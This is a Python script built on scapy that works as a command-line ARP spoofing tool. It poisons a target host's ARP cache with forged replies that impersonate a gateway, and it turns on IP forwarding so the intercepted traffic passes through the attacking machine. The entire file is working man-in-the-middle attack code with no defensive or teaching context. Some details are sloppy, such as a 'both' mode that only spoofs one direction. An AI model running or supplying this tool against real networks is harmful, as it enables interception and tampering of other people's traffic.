import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as sca
from optparse import OptionParser
from time import sleep

def get_arguments():
    parse=OptionParser()
    parse.add_option('-t','--target',dest='target_IP',help="Set IP target you want to ARP Spoof")
    parse.add_option('-s','--spoof',dest='spoof_IP',help="Set IP target you want to ARP Spoof")
    parse.add_option('-m','--mode',dest='mode',help="single|both")
    opts, args = parse.parse_args()
    if (opts.target_IP is None):
        parse.error("[#] Please specify target IP")
    if (opts.mode is None):
        opts.mode="single"
    return opts

class ARP_Spoof:
    def __init__(self,target_IP,spoof_IP):
        self.target_IP=target_IP
        self.spoof_IP=spoof_IP
        self.target_MAC=mac_extract(target_IP)
        self.spoof_MAC=mac_extract(spoof_IP)
        self.packets=0
    def spoof(self):
        ARP_req=sca.ARP(op=2,psrc=self.spoof_IP,pdst=self.target_IP,hwdst=self.target_MAC)
        #result = sca.srp(sca.Ether(dst="ec:63:d7:3f:79:f6")/ARP_req)
        sca.send(ARP_req,verbose=False)

    def restore(self):
        ARP_req=sca.ARP(op=2,psrc=self.spoof_IP,pdst=self.target_IP,hwdst=self.target_MAC,hwsrc=self.spoof_MAC)
        #result = sca.srp(sca.Ether(dst="ec:63:d7:3f:79:f6")/ARP_req)
        sca.send(ARP_req,verbose=False)    

def mac_extract(ip):
    result=sca.srp(sca.Ether(dst="ff:ff:ff:ff:ff:ff")/sca.ARP(pdst=ip),verbose=False)
    return result[0][0].answer.hwsrc

def enable_forwarding():
    print("[+] Enabling IPv4 Forwarding")
    with open("/proc/sys/net/ipv4/ip_forward","w") as file:
        file.write("1")

def disable_forwarding():
    print("[-] Disabling IPv4 Forwarding")
    with open("/proc/sys/net/ipv4/ip_forward","w") as file:
        file.write("0")
    
options=get_arguments()
mac_target=mac_extract(options.target_IP)
mac_gateway=mac_extract(options.spoof_IP)
packets=0

if __name__=="__main__":
    try:
        exe=ARP_Spoof(options.target_IP,options.spoof_IP)
        enable_forwarding()
        print("[+] ARP Spoofing started")
        while True:
            if (options.mode=="both"):
                exe.spoof()
                exe.spoof()
                sleep(3)
                packets+=2
                print(f'\r[+] Packets sent: {packets}',end='')
            else:
                exe.spoof()
                packets+=2
                print(f'\r[+] Packets sent: {packets}',end='')
                sleep(1)
    except KeyboardInterrupt:
        print("\r[-] Restoring ARP table to normal")
        exe.restore()
        disable_forwarding()